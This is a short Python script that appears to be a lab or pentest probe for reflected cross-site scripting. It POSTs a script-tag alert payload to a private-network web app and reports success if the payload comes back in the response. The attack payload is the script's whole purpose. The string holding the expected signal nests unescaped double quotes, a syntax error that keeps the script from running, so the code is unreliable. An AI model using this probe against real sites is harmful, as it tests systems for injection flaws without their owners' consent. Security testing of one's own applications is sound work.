import requests

# Target URL and payload for XSS testing
TARGET_URL = "http://192.168.2.69:3000"
PAYLOAD = '<script>alert("XSS Test")</script>'

def send_request(payload):
    # Prepare the data with the payload
    data = {"input": payload}
    
    try:
        # Send a POST request to the target URL
        response = requests.post(TARGET_URL, data=data)
        
        # Check if the server returned a successful status code (200-299)
        if 200 <= response.status_code < 300:
            return response.text
        else:
            print(f"Unexpected status code: {response.status_code}")
            return None
    
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def check_for_xss(response_text):
    # Define the expected success signal (message displayed in alert box)
    success_signal = "<script>alert("XSS Test")</script>"
    
    # Check if the response contains the success signal
    if success_signal in response_text:
        print("RESULT: SUCCESS")
        print(f"Evidence: {response_text}")
    else:
        print("RESULT: NO_SIGNAL")

def main():
    payload_response = send_request(PAYLOAD)
    if payload_response:
        check_for_xss(payload_response)

if __name__ == "__main__":
    main()